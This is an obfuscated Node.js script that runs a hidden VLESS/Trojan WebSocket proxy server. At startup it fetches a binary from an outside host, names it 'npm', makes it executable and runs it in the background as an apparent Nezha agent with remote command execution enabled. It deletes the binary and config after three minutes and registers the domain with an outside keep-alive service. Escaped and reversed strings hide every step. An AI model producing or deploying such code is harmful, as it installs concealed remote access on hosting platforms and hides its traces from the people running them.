var _0x77aff = (421613 ^ 421611) + (441094 ^ 441088);
const os = require("\u006F\u0073");
_0x77aff = "fgeiib".split("").reverse().join("");
var _0x7a44df;
const http = require("\u0068\u0074\u0074\u0070");
_0x7a44df = (199994 ^ 199987) + (224303 ^ 224300);
var _0x9742c;
const fs = require("\u0066\u0073");
_0x9742c = (679023 ^ 679016) + (520178 ^ 520183);
var _0x93g;
const axios = require("\u0061\u0078\u0069\u006F\u0073");
_0x93g = (405355 ^ 405347) + (203474 ^ 203476);
const net = require("\u006E\u0065\u0074");
const path = require("\u0070\u0061\u0074\u0068");
var _0x3bf = (814689 ^ 814688) + (441286 ^ 441294);
const crypto = require("\u0063\u0072\u0079\u0070\u0074\u006F");
_0x3bf = (785220 ^ 785217) + (369987 ^ 369986);
const {
  '\u0042\u0075\u0066\u0066\u0065\u0072': Buffer
} = require("\u0062\u0075\u0066\u0066\u0065\u0072");
const {
  '\u0065\u0078\u0065\u0063': exec,
  "execSync": execSync
} = require("\u0063\u0068\u0069\u006C\u0064\u005F\u0070\u0072\u006F\u0063\u0065\u0073\u0073");
const {
  '\u0057\u0065\u0062\u0053\u006F\u0063\u006B\u0065\u0074': WebSocket,
  "createWebSocketStream": createWebSocketStream
} = require("\u0077\u0073");
var _0x98a;
const UUID = process['\u0065\u006E\u0076']['\u0055\u0055\u0049\u0044'] || "\u0065\u0065\u0039\u0033\u0032\u0037\u0034\u0061\u002D\u0030\u0062\u0065\u0063\u002D\u0034\u0031\u0065\u0065\u002D\u0062\u0034\u0038\u0064\u002D\u0035\u0038\u0032\u0063\u0065\u0062\u0035\u0039\u0038\u0033\u0030\u0064";
_0x98a = (578509 ^ 578505) + (957341 ^ 957342);
var _0xf2b = (172341 ^ 172339) + (143616 ^ 143624);
const NEZHA_SERVER = process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0053\u0045\u0052\u0056\u0045\u0052'] || '';
_0xf2b = 457925 ^ 457933;
var _0x22e = (177164 ^ 177163) + (629544 ^ 629547);
const NEZHA_PORT = process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u0050\u004F\u0052\u0054'] || '';
_0x22e = 898835 ^ 898842;
const NEZHA_KEY = process['\u0065\u006E\u0076']['\u004E\u0045\u005A\u0048\u0041\u005F\u004B\u0045\u0059'] || '';
var _0x1bdcb;
const DOMAIN = process['\u0065\u006E\u0076']['\u0044\u004F\u004D\u0041\u0049\u004E'] || "\u0031\u0032\u0033\u0034\u002E\u0061\u0062\u0063\u002E\u0063\u006F\u006D";
_0x1bdcb = (218664 ^ 218668) + (933083 ^ 933082);
const AUTO_ACCESS = process['\u0065\u006E\u0076']['\u0041\u0055\u0054\u004F\u005F\u0041\u0043\u0043\u0045\u0053\u0053'] || !![];
const WSPATH = process['\u0065\u006E\u0076']['\u0057\u0053\u0050\u0041\u0054\u0048'] || UUID['\u0073\u006C\u0069\u0063\u0065'](204727 ^ 204727, 553064 ^ 553056);
const SUB_PATH = process['\u0065\u006E\u0076']['\u0053\u0055\u0042\u005F\u0050\u0041\u0054\u0048'] || "\u0073\u0075\u0062";
const NAME = process['\u0065\u006E\u0076']['\u004E\u0041\u004D\u0045'] || '';
const PORT = process['\u0065\u006E\u0076']['\u0050\u004F\u0052\u0054'] || 193335 ^ 191875;
var _0xf35d6e;
let ISP = '';
_0xf35d6e = (807512 ^ 807514) + (142777 ^ 142783);
const GetISP = async () => {
  try {
    const res = await axios['\u0067\u0065\u0074']("\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0070\u0069\u002E\u0069\u0070\u002E\u0073\u0062\u002F\u0067\u0065\u006F\u0069\u0070");
    var _0xc815g;
    const data = res['\u0064\u0061\u0074\u0061'];
    _0xc815g = (668910 ^ 668906) + (751324 ^ 751324);
    ISP = `${data['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065']}-${data['\u0069\u0073\u0070']}`['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u0020', '\u0067'), "\u005F");
  } catch (e) {
    ISP = "\u0055\u006E\u006B\u006E\u006F\u0077\u006E";
  }
};
GetISP();
var _0x8ce5b;
const httpServer = http['\u0063\u0072\u0065\u0061\u0074\u0065\u0053\u0065\u0072\u0076\u0065\u0072']((req, res) => {
  if (req['\u0075\u0072\u006C'] === "\u002F") {
    var _0x_0xfd6 = (647447 ^ 647455) + (104975 ^ 104967);
    const filePath = path['\u006A\u006F\u0069\u006E'](__dirname, "\u0069\u006E\u0064\u0065\u0078\u002E\u0068\u0074\u006D\u006C");
    _0x_0xfd6 = '\u0063\u0063\u0070\u0069\u006B\u006A';
    fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065'](filePath, "8ftu".split("").reverse().join(""), (err, content) => {
      if (err) {
        res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](209416 ^ 209600, {
          "\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065": 'text/html'
        });
        res['\u0065\u006E\u0064']("\u0048\u0065\u006C\u006C\u006F\u0020\u0077\u006F\u0072\u006C\u0064\u0021");
        return;
      }
      res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](237293 ^ 237093, {
        'Content-Type': "\u0074\u0065\u0078\u0074\u002F\u0068\u0074\u006D\u006C"
      });
      res['\u0065\u006E\u0064'](content);
    });
    return;
  } else if (req['\u0075\u0072\u006C'] === `/${SUB_PATH}`) {
    var _0x5172af = (474838 ^ 474847) + (387571 ^ 387573);
    const namePart = NAME ? `${NAME}-${ISP}` : ISP;
    _0x5172af = (704078 ^ 704077) + (584637 ^ 584629);
    var _0x771b = (368440 ^ 368440) + (463232 ^ 463238);
    const vlessURL = `vless://${UUID}@${DOMAIN}:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;
    _0x771b = (306171 ^ 306162) + (185058 ^ 185063);
    var _0x765bcd = (395071 ^ 395064) + (894718 ^ 894719);
    const trojanURL = `trojan://${UUID}@${DOMAIN}:443?security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;
    _0x765bcd = (406278 ^ 406278) + (102859 ^ 102858);
    const subscription = vlessURL + "\u000A" + trojanURL;
    var _0xfbfdg;
    const base64Content = Buffer['\u0066\u0072\u006F\u006D'](subscription)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0062\u0061\u0073\u0065\u0036\u0034");
    _0xfbfdg = (185574 ^ 185582) + (831198 ^ 831192);
    res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](215809 ^ 216009, {
      "\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065": 'text/plain'
    });
    res['\u0065\u006E\u0064'](base64Content + "\u000A");
  } else {
    res['\u0077\u0072\u0069\u0074\u0065\u0048\u0065\u0061\u0064'](356309 ^ 355905, {
      "\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065": "\u0074\u0065\u0078\u0074\u002F\u0070\u006C\u0061\u0069\u006E"
    });
    res['\u0065\u006E\u0064']("\u004E\u006F\u0074\u0020\u0046\u006F\u0075\u006E\u0064\u000A");
  }
});
_0x8ce5b = 426015 ^ 426011;
const wss = new WebSocket['\u0053\u0065\u0072\u0076\u0065\u0072']({
  '\u0073\u0065\u0072\u0076\u0065\u0072': httpServer
});
var _0xc_0xe8e = (401217 ^ 401217) + (412520 ^ 412526);
const uuid = UUID['\u0072\u0065\u0070\u006C\u0061\u0063\u0065'](new RegExp('\u002D', '\u0067'), "");
_0xc_0xe8e = (313204 ^ 313200) + (620280 ^ 620285);
var _0x34cf = (423892 ^ 423890) + (262115 ^ 262113);
const DNS_SERVERS = ["4.4.8.8".split("").reverse().join(""), "\u0031\u002E\u0031\u002E\u0031\u002E\u0031"];
_0x34cf = (160375 ^ 160368) + (573703 ^ 573702);
function resolveHost(host) {
  return new Promise((resolve, reject) => {
    if (new RegExp("$)?]9-0[]9-0[?]10[|]9-0[]4-0[2|]5-0[52:?(}3{).\\)?]9-0[]9-0[?]10[|]9-0[]4-0[2|]5-0[52:?(:?(^".split("").reverse().join(""), "")['\u0074\u0065\u0073\u0074'](host)) {
      resolve(host);
      return;
    }
    let _0xg2bd = 579114 ^ 579114;
    function _0x9941eb() {
      if (_0xg2bd >= DNS_SERVERS['\u006C\u0065\u006E\u0067\u0074\u0068']) {
        reject(new Error(`Failed to resolve ${host} with all DNS servers`));
        return;
      }
      var _0xf6d45c;
      const _0xg3678e = DNS_SERVERS[_0xg2bd];
      _0xf6d45c = 318861 ^ 318856;
      _0xg2bd++;
      const _0x6cb6aa = `https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`;
      axios['\u0067\u0065\u0074'](_0x6cb6aa, {
        '\u0074\u0069\u006D\u0065\u006F\u0075\u0074': 5000,
        '\u0068\u0065\u0061\u0064\u0065\u0072\u0073': {
          'Accept': "\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u0064\u006E\u0073\u002D\u006A\u0073\u006F\u006E"
        }
      })['\u0074\u0068\u0065\u006E'](response => {
        var _0xcf32fa;
        const _0xbdbf = response['\u0064\u0061\u0074\u0061'];
        _0xcf32fa = (456729 ^ 456734) + (887205 ^ 887213);
        if (_0xbdbf['\u0053\u0074\u0061\u0074\u0075\u0073'] === (267246 ^ 267246) && _0xbdbf['\u0041\u006E\u0073\u0077\u0065\u0072'] && _0xbdbf['\u0041\u006E\u0073\u0077\u0065\u0072']['\u006C\u0065\u006E\u0067\u0074\u0068'] > (585097 ^ 585097)) {
          var _0xf9ab;
          const _0xe9f0e = _0xbdbf['\u0041\u006E\u0073\u0077\u0065\u0072']['\u0066\u0069\u006E\u0064'](record => record['\u0074\u0079\u0070\u0065'] === (836769 ^ 836768));
          _0xf9ab = (809578 ^ 809571) + (509718 ^ 509719);
          if (_0xe9f0e) {
            resolve(_0xe9f0e['\u0064\u0061\u0074\u0061']);
            return;
          }
        }
        _0x9941eb();
      })['\u0063\u0061\u0074\u0063\u0068'](error => {
        _0x9941eb();
      });
    }
    _0x9941eb();
  });
}
function handleVlessConnection(ws, msg) {
  const [VERSION] = msg;
  var _0xeee3c = (123264 ^ 123273) + (140435 ^ 140437);
  const _0xaf254a = msg['\u0073\u006C\u0069\u0063\u0065'](219288 ^ 219289, 141350 ^ 141367);
  _0xeee3c = (897208 ^ 897215) + (879197 ^ 879198);
  if (!_0xaf254a['\u0065\u0076\u0065\u0072\u0079']((v, i) => v == parseInt(uuid['\u0073\u0075\u0062\u0073\u0074\u0072'](i * (841145 ^ 841147), 150108 ^ 150110), 521797 ^ 521813))) return false;
  let i = msg['\u0073\u006C\u0069\u0063\u0065'](477122 ^ 477139, 577077 ^ 577063)['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0038']() + (108544 ^ 108563);
  var _0xb05f = (796080 ^ 796088) + (212950 ^ 212946);
  const _0x5_0x718 = msg['\u0073\u006C\u0069\u0063\u0065'](i, i += 330761 ^ 330763)['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](734467 ^ 734467);
  _0xb05f = (141492 ^ 141492) + (401438 ^ 401437);
  const _0x11g22c = msg['\u0073\u006C\u0069\u0063\u0065'](i, i += 337876 ^ 337877)['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0038']();
  const _0x3d193d = _0x11g22c == (777981 ^ 777980) ? msg['\u0073\u006C\u0069\u0063\u0065'](i, i += 241265 ^ 241269)['\u006A\u006F\u0069\u006E']("\u002E") : _0x11g22c == (299549 ^ 299551) ? new TextDecoder()['\u0064\u0065\u0063\u006F\u0064\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](i + (315210 ^ 315211), i += (410249 ^ 410248) + msg['\u0073\u006C\u0069\u0063\u0065'](i, i + (523154 ^ 523155))['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0038']())) : _0x11g22c == (572475 ^ 572472) ? msg['\u0073\u006C\u0069\u0063\u0065'](i, i += 282043 ^ 282027)['\u0072\u0065\u0064\u0075\u0063\u0065']((s, b, i, a) => i % (524885 ^ 524887) ? s['\u0063\u006F\u006E\u0063\u0061\u0074'](a['\u0073\u006C\u0069\u0063\u0065'](i - (668670 ^ 668671), i + (411528 ^ 411529))) : s, [])['\u006D\u0061\u0070'](b => b['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](159396 ^ 159396)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](540749 ^ 540765))['\u006A\u006F\u0069\u006E']("\u003A") : '';
  ws['\u0073\u0065\u006E\u0064'](new Uint8Array([VERSION, 460865 ^ 460865]));
  const _0xda3cb = createWebSocketStream(ws);
  resolveHost(_0x3d193d)['\u0074\u0068\u0065\u006E'](resolvedIP => {
    net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({
      "host": resolvedIP,
      '\u0070\u006F\u0072\u0074': _0x5_0x718
    }, function () {
      this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](i));
      _0xda3cb['\u006F\u006E']("rorre".split("").reverse().join(""), () => {})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("rorre".split("").reverse().join(""), () => {})['\u0070\u0069\u0070\u0065'](_0xda3cb);
    })['\u006F\u006E']("rorre".split("").reverse().join(""), () => {});
  })['\u0063\u0061\u0074\u0063\u0068'](error => {
    net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({
      '\u0068\u006F\u0073\u0074': _0x3d193d,
      "port": _0x5_0x718
    }, function () {
      this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](i));
      _0xda3cb['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072", () => {})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072", () => {})['\u0070\u0069\u0070\u0065'](_0xda3cb);
    })['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072", () => {});
  });
  return !![];
}
function handleTrojanConnection(ws, msg) {
  try {
    if (msg['\u006C\u0065\u006E\u0067\u0074\u0068'] < (516501 ^ 516527)) return false;
    var _0x1ag30g;
    const _0xf365ge = msg['\u0073\u006C\u0069\u0063\u0065'](207573 ^ 207573, 110654 ^ 110598)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']();
    _0x1ag30g = 577012 ^ 577010;
    const _0xa7ef = [UUID];
    let _0x6a876f = null;
    for (const _0x19be of _0xa7ef) {
      const _0x3a_0xa2e = crypto['\u0063\u0072\u0065\u0061\u0074\u0065\u0048\u0061\u0073\u0068']("\u0073\u0068\u0061\u0032\u0032\u0034")['\u0075\u0070\u0064\u0061\u0074\u0065'](_0x19be)['\u0064\u0069\u0067\u0065\u0073\u0074']("\u0068\u0065\u0078");
      if (_0x3a_0xa2e === _0xf365ge) {
        _0x6a876f = _0x19be;
        break;
      }
    }
    if (!_0x6a876f) return false;
    let _0x9f7a = 606553 ^ 606561;
    if (msg[_0x9f7a] === (915473 ^ 915484) && msg[_0x9f7a + (105335 ^ 105334)] === (408115 ^ 408121)) {
      _0x9f7a += 672090 ^ 672088;
    }
    var _0xb_0x966;
    const _0xb212cg = msg[_0x9f7a];
    _0xb_0x966 = (783214 ^ 783212) + (401891 ^ 401890);
    if (_0xb212cg !== (623956 ^ 623957)) return false;
    _0x9f7a += 611227 ^ 611226;
    var _0xf_0xb68 = (358880 ^ 358885) + (762163 ^ 762162);
    const _0xacac = msg[_0x9f7a];
    _0xf_0xb68 = 344676 ^ 344673;
    _0x9f7a += 304288 ^ 304289;
    let _0xg619be, _0x900c0g;
    if (_0xacac === (506669 ^ 506668)) {
      _0xg619be = msg['\u0073\u006C\u0069\u0063\u0065'](_0x9f7a, _0x9f7a + (745248 ^ 745252))['\u006A\u006F\u0069\u006E']("\u002E");
      _0x9f7a += 905874 ^ 905878;
    } else if (_0xacac === (583250 ^ 583249)) {
      const _0x96316b = msg[_0x9f7a];
      _0x9f7a += 912351 ^ 912350;
      _0xg619be = msg['\u0073\u006C\u0069\u0063\u0065'](_0x9f7a, _0x9f7a + _0x96316b)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']();
      _0x9f7a += _0x96316b;
    } else if (_0xacac === (465551 ^ 465547)) {
      _0xg619be = msg['\u0073\u006C\u0069\u0063\u0065'](_0x9f7a, _0x9f7a + (260396 ^ 260412))['\u0072\u0065\u0064\u0075\u0063\u0065']((s, b, i, a) => i % (395069 ^ 395071) ? s['\u0063\u006F\u006E\u0063\u0061\u0074'](a['\u0073\u006C\u0069\u0063\u0065'](i - (154501 ^ 154500), i + (590559 ^ 590558))) : s, [])['\u006D\u0061\u0070'](b => b['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](843084 ^ 843084)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067'](184053 ^ 184037))['\u006A\u006F\u0069\u006E']("\u003A");
      _0x9f7a += 239518 ^ 239502;
    } else {
      return false;
    }
    _0x900c0g = msg['\u0072\u0065\u0061\u0064\u0055\u0049\u006E\u0074\u0031\u0036\u0042\u0045'](_0x9f7a);
    _0x9f7a += 785062 ^ 785060;
    if (_0x9f7a < msg['\u006C\u0065\u006E\u0067\u0074\u0068'] && msg[_0x9f7a] === (190413 ^ 190400) && msg[_0x9f7a + (401519 ^ 401518)] === (277352 ^ 277346)) {
      _0x9f7a += 617044 ^ 617046;
    }
    var _0x23c = (797270 ^ 797266) + (349058 ^ 349057);
    const _0x5b8a = createWebSocketStream(ws);
    _0x23c = '\u0063\u006B\u006F\u0069\u006E\u0066';
    resolveHost(_0xg619be)['\u0074\u0068\u0065\u006E'](resolvedIP => {
      net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({
        '\u0068\u006F\u0073\u0074': resolvedIP,
        "port": _0x900c0g
      }, function () {
        if (_0x9f7a < msg['\u006C\u0065\u006E\u0067\u0074\u0068']) {
          this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](_0x9f7a));
        }
        _0x5b8a['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072", () => {})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072", () => {})['\u0070\u0069\u0070\u0065'](_0x5b8a);
      })['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072", () => {});
    })['\u0063\u0061\u0074\u0063\u0068'](error => {
      net['\u0063\u006F\u006E\u006E\u0065\u0063\u0074']({
        "host": _0xg619be,
        '\u0070\u006F\u0072\u0074': _0x900c0g
      }, function () {
        if (_0x9f7a < msg['\u006C\u0065\u006E\u0067\u0074\u0068']) {
          this['\u0077\u0072\u0069\u0074\u0065'](msg['\u0073\u006C\u0069\u0063\u0065'](_0x9f7a));
        }
        _0x5b8a['\u006F\u006E']("rorre".split("").reverse().join(""), () => {})['\u0070\u0069\u0070\u0065'](this)['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072", () => {})['\u0070\u0069\u0070\u0065'](_0x5b8a);
      })['\u006F\u006E']("\u0065\u0072\u0072\u006F\u0072", () => {});
    });
    return !![];
  } catch (error) {
    return false;
  }
}
wss['\u006F\u006E']("noitcennoc".split("").reverse().join(""), (ws, req) => {
  var _0x72c68e;
  const url = req['\u0075\u0072\u006C'] || '';
  _0x72c68e = (815276 ^ 815277) + (263230 ^ 263228);
  ws['\u006F\u006E\u0063\u0065']("\u006D\u0065\u0073\u0073\u0061\u0067\u0065", msg => {
    if (msg['\u006C\u0065\u006E\u0067\u0074\u0068'] > (355496 ^ 355513) && msg[109373 ^ 109373] === (146708 ^ 146708)) {
      const id = msg['\u0073\u006C\u0069\u0063\u0065'](379558 ^ 379559, 255471 ^ 255486);
      const isVless = id['\u0065\u0076\u0065\u0072\u0079']((v, i) => v == parseInt(uuid['\u0073\u0075\u0062\u0073\u0074\u0072'](i * (678494 ^ 678492), 754634 ^ 754632), 392189 ^ 392173));
      if (isVless) {
        if (!handleVlessConnection(ws, msg)) {
          ws['\u0063\u006C\u006F\u0073\u0065']();
        }
        return;
      }
    }
    if (!handleTrojanConnection(ws, msg)) {
      ws['\u0063\u006C\u006F\u0073\u0065']();
    }
  })['\u006F\u006E']("rorre".split("").reverse().join(""), () => {});
});
var _0xb4171d = (745168 ^ 745168) + (227520 ^ 227526);
const getDownloadUrl = () => {
  const arch = os['\u0061\u0072\u0063\u0068']();
  if (arch === "\u0061\u0072\u006D" || arch === "\u0061\u0072\u006D\u0036\u0034" || arch === "46hcraa".split("").reverse().join("")) {
    if (!NEZHA_PORT) {
      return "\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0076\u0031";
    } else {
      return "\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0072\u006D\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0061\u0067\u0065\u006E\u0074";
    }
  } else {
    if (!NEZHA_PORT) {
      return "\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u006D\u0064\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0076\u0031";
    } else {
      return "\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u006D\u0064\u0036\u0034\u002E\u0073\u0073\u0073\u0073\u002E\u006E\u0079\u0063\u002E\u006D\u006E\u002F\u0061\u0067\u0065\u006E\u0074";
    }
  }
};
_0xb4171d = (250907 ^ 250909) + (396329 ^ 396321);
const downloadFile = async () => {
  if (!NEZHA_SERVER && !NEZHA_KEY) return;
  try {
    const url = getDownloadUrl();
    var _0xegece = (552505 ^ 552507) + (527042 ^ 527045);
    const response = await axios({
      '\u006D\u0065\u0074\u0068\u006F\u0064': 'get',
      "url": url,
      '\u0072\u0065\u0073\u0070\u006F\u006E\u0073\u0065\u0054\u0079\u0070\u0065': "\u0073\u0074\u0072\u0065\u0061\u006D"
    });
    _0xegece = (716950 ^ 716946) + (507615 ^ 507610);
    const writer = fs['\u0063\u0072\u0065\u0061\u0074\u0065\u0057\u0072\u0069\u0074\u0065\u0053\u0074\u0072\u0065\u0061\u006D']("mpn".split("").reverse().join(""));
    response['\u0064\u0061\u0074\u0061']['\u0070\u0069\u0070\u0065'](writer);
    return new Promise((resolve, reject) => {
      writer['\u006F\u006E']("hsinif".split("").reverse().join(""), () => {
        console['\u006C\u006F\u0067']("\u006E\u0070\u006D\u0020\u0064\u006F\u0077\u006E\u006C\u006F\u0061\u0064\u0020\u0073\u0075\u0063\u0063\u0065\u0073\u0073\u0066\u0075\u006C\u006C\u0079");
        exec("mpn x+ domhc".split("").reverse().join(""), err => {
          if (err) reject(err);
          resolve();
        });
      });
      writer['\u006F\u006E']("rorre".split("").reverse().join(""), reject);
    });
  } catch (err) {
    throw err;
  }
};
var _0x2_0xc37 = (613768 ^ 613774) + (281052 ^ 281053);
const runnz = async () => {
  try {
    const status = execSync("\"mp]n[/.\" perg | \"perg\" v- perg | xua sp".split("").reverse().join(""), {
      "encoding": "\u0075\u0074\u0066\u002D\u0038"
    });
    if (status['\u0074\u0072\u0069\u006D']() !== '') {
      console['\u006C\u006F\u0067']("\u006E\u0070\u006D\u0020\u0069\u0073\u0020\u0061\u006C\u0072\u0065\u0061\u0064\u0079\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067\u002C\u0020\u0073\u006B\u0069\u0070\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067\u002E\u002E\u002E");
      return;
    }
  } catch (e) {}
  await downloadFile();
  let command = '';
  var _0x9ca;
  let tlsPorts = ["344".split("").reverse().join(""), "3448".split("").reverse().join(""), "\u0032\u0030\u0039\u0036", "\u0032\u0030\u0038\u0037", "\u0032\u0030\u0038\u0033", "\u0032\u0030\u0035\u0033"];
  _0x9ca = (694205 ^ 694205) + (829403 ^ 829404);
  if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
    var _0x3cd5ac = (230557 ^ 230557) + (343191 ^ 343187);
    const NEZHA_TLS = tlsPorts['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](NEZHA_PORT) ? "\u002D\u002D\u0074\u006C\u0073" : '';
    _0x3cd5ac = (844729 ^ 844721) + (652872 ^ 652875);
    command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
  } else if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      var _0x8d90cb = (858301 ^ 858303) + (466802 ^ 466801);
      const port = NEZHA_SERVER['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073']("\u003A") ? NEZHA_SERVER['\u0073\u0070\u006C\u0069\u0074']("\u003A")['\u0070\u006F\u0070']() : '';
      _0x8d90cb = 328317 ^ 328319;
      var _0x59gcb;
      const NZ_TLS = tlsPorts['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](port) ? "\u0074\u0072\u0075\u0065" : "\u0066\u0061\u006C\u0073\u0065";
      _0x59gcb = 102841 ^ 102842;
      var _0x8c_0xge0 = (295613 ^ 295609) + (266009 ^ 266011);
      const configYaml = `client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${NZ_TLS}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;
      _0x8c_0xge0 = (240283 ^ 240285) + (838935 ^ 838943);
      fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063']("\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u0079\u0061\u006D\u006C", configYaml);
    }
    command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;
  } else {
    console['\u006C\u006F\u0067']("\u004E\u0045\u005A\u0048\u0041\u0020\u0076\u0061\u0072\u0069\u0061\u0062\u006C\u0065\u0020\u0069\u0073\u0020\u0065\u006D\u0070\u0074\u0079\u002C\u0020\u0073\u006B\u0069\u0070\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067");
    return;
  }
  try {
    exec(command, {
      '\u0073\u0068\u0065\u006C\u006C': '/bin/bash'
    }, err => {
      if (err) console['\u0065\u0072\u0072\u006F\u0072'](":rorre gninnur mpn".split("").reverse().join(""), err);else console['\u006C\u006F\u0067']("\u006E\u0070\u006D\u0020\u0069\u0073\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067");
    });
  } catch (error) {
    console['\u0065\u0072\u0072\u006F\u0072'](`error: ${error}`);
  }
};
_0x2_0xc37 = 598091 ^ 598090;
async function addAccessTask() {
  if (!AUTO_ACCESS) return;
  if (!DOMAIN) {
    return;
  }
  const _0xadcebd = `https://${DOMAIN}`;
  try {
    const _0xbc1b = await axios['\u0070\u006F\u0073\u0074']("\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u006F\u006F\u006F\u006F\u002E\u0073\u0065\u0072\u0076\u0030\u0030\u002E\u006E\u0065\u0074\u002F\u0061\u0064\u0064\u002D\u0075\u0072\u006C", {
      "url": _0xadcebd
    }, {
      "headers": {
        "\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065": 'application/json'
      }
    });
    console['\u006C\u006F\u0067']("\u0041\u0075\u0074\u006F\u006D\u0061\u0074\u0069\u0063\u0020\u0041\u0063\u0063\u0065\u0073\u0073\u0020\u0054\u0061\u0073\u006B\u0020\u0061\u0064\u0064\u0065\u0064\u0020\u0073\u0075\u0063\u0063\u0065\u0073\u0073\u0066\u0075\u006C\u006C\u0079");
  } catch (error) {}
}
const delFiles = () => {
  fs['\u0075\u006E\u006C\u0069\u006E\u006B']("\u006E\u0070\u006D", () => {});
  fs['\u0075\u006E\u006C\u0069\u006E\u006B']("\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u0079\u0061\u006D\u006C", () => {});
};
httpServer['\u006C\u0069\u0073\u0074\u0065\u006E'](PORT, () => {
  runnz();
  setTimeout(() => {
    delFiles();
  }, 180000);
  addAccessTask();
  console['\u006C\u006F\u0067'](`Server is running on port ${PORT}`);
});
